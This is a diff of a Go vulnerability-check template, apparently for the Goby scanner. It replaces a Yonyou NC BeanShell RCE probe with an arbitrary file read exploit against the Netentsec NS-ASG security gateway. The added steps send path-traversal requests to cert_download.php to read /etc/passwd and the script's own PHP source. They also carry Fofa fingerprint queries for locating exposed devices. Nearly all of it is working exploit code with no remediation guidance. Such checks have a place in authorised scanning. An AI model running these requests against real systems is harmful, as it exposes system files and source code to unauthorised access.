@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "网康 NS-ASG安全网关 cert_download.php 任意文件读取漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"网康科技-NS-ASG安全网关\" || product=\"网康科技-NS-ASG安全网关\"",
+  "GobyQuery": "app=\"网康科技-NS-ASG安全网关\" || product=\"网康科技-NS-ASG安全网关\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -26,11 +26,11 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/admin/cert_download.php?file=test.txt&certfile=cert_download.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "<?php",
             "bz": ""
           }
         ]
@@ -107,7 +138,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "网康 NS-ASG安全网关 cert_download.php 任意文件读取漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "NS-ASG cert_download.php file read",
       "Product": "",
       "Description": "",
       "Recommendation": "",
